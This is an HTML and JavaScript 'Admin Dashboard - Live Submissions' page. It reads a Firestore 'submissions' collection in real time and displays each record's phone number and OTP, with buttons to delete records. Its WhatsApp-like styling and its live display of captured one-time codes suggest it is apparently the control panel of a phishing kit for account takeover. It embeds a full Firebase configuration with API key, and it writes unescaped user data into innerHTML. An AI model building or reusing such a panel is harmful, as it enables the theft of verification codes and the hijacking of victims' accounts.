<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0b141a;
      color: white;
    }

    /* HEADER */
    .header {
      background: #111b21;
      padding: 15px;
      text-align: center;
      font-size: 18px;
      font-weight: bold;
      color: #25d366;
      border-bottom: 1px solid rgba(255,255,255,0.05);
    }

    /* CONTAINER */
    .container {

  padding: 15px;

  display: grid;

  grid-template-columns:
    repeat(4, 1fr);

  gap: 15px;

}

@media (max-width: 1100px) {

  .container {
    grid-template-columns:
      repeat(3, 1fr);
  }

}

@media (max-width: 800px) {

  .container {
    grid-template-columns:
      repeat(2, 1fr);
  }

}

@media (max-width: 500px) {

  .container {
    grid-template-columns: 1fr;
  }

}

    /* CARD */
    .card {

  background: #111b21;

  padding: 16px;

  border-radius: 14px;

  box-shadow:
    0 8px 24px rgba(0,0,0,0.25);

  border:
    1px solid rgba(255,255,255,0.04);

  transition: 0.2s;

}

.card:hover {

  transform: translateY(-3px);

}

    .row {
      margin: 5px 0;
      font-size: 14px;
      color: #cbd5e1;
    }

    .label {
      color: #25d366;
      font-weight: bold;
    }

    .status {
      margin-top: 8px;
      font-size: 13px;
      padding: 4px 8px;
      display: inline-block;
      border-radius: 6px;
      background: rgba(37, 211, 102, 0.1);
      color: #25d366;
    }

    .delete-btn {

  margin-top: 14px;

  width: 100%;

  padding: 12px;

  border: none;

  border-radius: 10px;

  background:
    linear-gradient(
      135deg,
      #25d366,
      #128c7e
    );

  color: white;

  font-size: 14px;

  font-weight: bold;

  cursor: pointer;

  transition: 0.2s;

}

.delete-btn:hover {

  transform: scale(1.02);

  opacity: 0.92;

}

</style>
</head>

<body>

<div class="header">
  Admin Dashboard - Live Submissions
</div>

<div class="container" id="list"></div>

<!-- FIREBASE -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";

  import {
    getFirestore,
    collection,
    onSnapshot,
    deleteDoc,
    doc
  }

from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDpZxduOiWNanY82r1fFJ-kosZTKZosx4E",
    authDomain: "register-12a60.firebaseapp.com",
    projectId: "register-12a60",
    storageBucket: "register-12a60.firebasestorage.app",
    messagingSenderId: "172443565306",
    appId: "1:172443565306:web:93ff965da73158f0521d43",
    measurementId: "G-46MXF2FC8Q"
  };

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const list = document.getElementById("list");

  onSnapshot(

      collection(db, "submissions"),

      (snapshot) => {

        console.log("✅ Connected to Firestore");
        console.log("📄 Documents:", snapshot.size);

        list.innerHTML = "";

        snapshot.forEach((docSnap) => {

          console.log("Document:", docSnap.id);
          console.log(docSnap.data());

          const data = docSnap.data();

          const div = document.createElement("div");

          div.className = "card";

          div.innerHTML = `

        <div class="row">
          <span class="label">Phone:</span>
          ${data.phone || ""}
        </div>

        <div class="row">
          <span class="label">OTP:</span>
          ${data.otp || "Not submitted"}
        </div>

        <div class="status">
          ${data.status || "Pending"}
        </div>

        <button class="delete-btn">
          Delete
        </button>

      `;

          div.querySelector(".delete-btn")
            .addEventListener("click", async () => {

              await deleteDoc(
                doc(db, "submissions", docSnap.id)
              );

            });

          list.prepend(div);

        });

      },

      (error) => {

        console.error("❌ Snapshot Error:", error);

      }

    );

</script>

</body>
</html>
